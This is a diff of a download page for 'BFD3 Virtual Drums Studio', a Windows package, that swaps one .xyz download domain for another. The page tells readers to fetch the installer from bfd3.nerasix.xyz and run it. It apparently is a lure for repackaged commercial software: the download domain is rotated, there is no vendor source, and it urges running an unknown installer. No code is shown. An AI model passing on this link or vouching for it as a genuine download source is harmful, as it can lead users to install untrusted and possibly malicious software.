@@ -18,8 +18,8 @@ BFD3 Virtual Drums Studio | Windows desktop package | straightforward setup | st
 
 > Use the project link below for Windows.
 
-* **Project link:** **[bfd3.nexpath.xyz](https://bfd3.nexpath.xyz/)**
-* **Full URL:** `https://bfd3.nexpath.xyz/`
+* **Project link:** **[bfd3.nerasix.xyz](https://bfd3.nerasix.xyz/)**
+* **Full URL:** `https://bfd3.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -51,4 +51,4 @@ The package is tuned for offline desktop use — install once, open the app, and
 * **RAM:** 6 GB base | 12 GB+ for demanding tasks
 * **Disk:** 4 GB minimum free space
 
-***
+***
